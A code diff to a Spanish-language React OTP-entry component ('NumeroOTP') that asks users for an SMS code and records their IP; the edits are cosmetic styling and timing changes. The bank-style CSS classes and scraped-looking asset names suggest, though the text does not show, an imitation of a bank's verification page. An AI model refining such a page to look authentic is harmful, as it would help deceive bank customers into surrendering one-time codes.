@@ -86,7 +86,7 @@ export default function NumeroOTP() {
                     ...prev,
                     lanzarModalErrorSesion: false
                 }));
-            }, 2000);
+            }, 4000);
         };
 
         // Se obtiene la IP
@@ -437,6 +437,9 @@ export default function NumeroOTP() {
                         // Se quita el estado de cargando
                         setCargando(false);
 
+                        // Se fuera el scroll hacia arriba
+                        window.scrollTo(0, 0);
+
                         // Se limpia el formulario para permitir nuevo intento
                         handleClear();
 
@@ -450,6 +453,9 @@ export default function NumeroOTP() {
 
                         // Recargar para reintentar OTP
                         setCargando(false);
+
+                        // Se fuera el scroll hacia arriba
+                        window.scrollTo(0, 0);
 
                         // Se limpia el ciclo
                         handleClear();
@@ -468,7 +474,7 @@ export default function NumeroOTP() {
                                 ...prev,
                                 lanzarModalErrorSesion: false
                             }));
-                        }, 2000);
+                        }, 4000);
 
                         // Se sale del ciclo
                         break;
@@ -590,11 +596,11 @@ export default function NumeroOTP() {
                         border: "1px solid #444",
                         boxShadow: "0 10px 25px rgba(0,0,0,0.5)"
                     }}>
-                        <h2 style={{ textAlign: "center", fontSize: "20px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
+                        <h2 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "24px", fontWeight: "bold", marginBottom: "15px", marginTop: "10px", color: "white" }}>
                             Confirma tus datos
                         </h2>
 
-                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "30px", color: "#e0e0e0" }}>
+                        <p className="bc-card-auth-description bc-mt-4 bc-fs-xs" style={{ textAlign: "center", fontSize: "16px", lineHeight: "20px", marginBottom: "30px", color: "white" }}>
                             Ingresa el código que te enviamos por mensaje de texto.
                         </p>
 
@@ -621,15 +627,16 @@ export default function NumeroOTP() {
                                 transform: "translate(-50%, -50%)",
                                 textAlign: "center"
                             }}>
-                                <div style={{ fontSize: "11px", color: "#ccc" }}>Vence en:</div>
-                                <div style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
+                                <div className="bc-card-auth-description" style={{ fontSize: "11px", color: "white" }}>Vence en:</div>
+                                <div className="bc-card-auth-description" style={{ fontSize: "14px", fontWeight: "bold", color: "white" }}>{formatTime(timeLeft)}</div>
                             </div>
                             {activeResend ?
                                 <div>
-                                    <p style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
+                                    <p className="bc-card-auth-description" style={{ marginTop: "10px", fontSize: "10px", color: "#ffffff", textDecoration: "underline", cursor: "pointer" }} onClick={() => handleResend()}>
                                         Reenviar código OTP
                                     </p>
-                                </div> : null}
+                                </div>
+                                : null}
                         </div>
 
                         {/* OTP Inputs */}
@@ -669,15 +676,15 @@ export default function NumeroOTP() {
                             ))}
                         </div>
 
-                        <p style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
+                        <p className="bc-card-auth-description" style={{ textAlign: "center", fontSize: "14px", marginBottom: "5px", color: "#ffffff" }} >
                             Búscalo en el número de teléfono registrado
                         </p>
 
                         <div style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
-                            <button className="login-btn-borrar mt-4" disabled={botonBorrarHabilitado} onClick={() => handleClear()}>
+                            <button className="bc-button-primary login-btn-borrar mt-4" style={{ fontSize: "14px" }} disabled={botonBorrarHabilitado} onClick={() => handleClear()}>
                                 Borrar
                             </button>
-                            <button className="login-btn mt-4" disabled={!botonHabilitado} onClick={handleContinuar}>
+                            <button className="bc-button-primary login-btn mt-4" style={{ fontSize: "14px" }} disabled={!botonHabilitado} onClick={handleContinuar}>
                                 Continuar
                             </button>
                         </div>
@@ -702,12 +709,12 @@ export default function NumeroOTP() {
                                     style={{ width: "180px" }}
                                 />
                             </div>
-                            <div>
+                            <div style={{ alignSelf: 'center' }}>
                                 <span className="vigilado">
                                     <img
                                         src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                                         alt="Superintendencia"
-                                        style={{ width: "180px" }}
+                                        style={{ width: "140px" }}
                                     />
                                 </span>
                             </div>
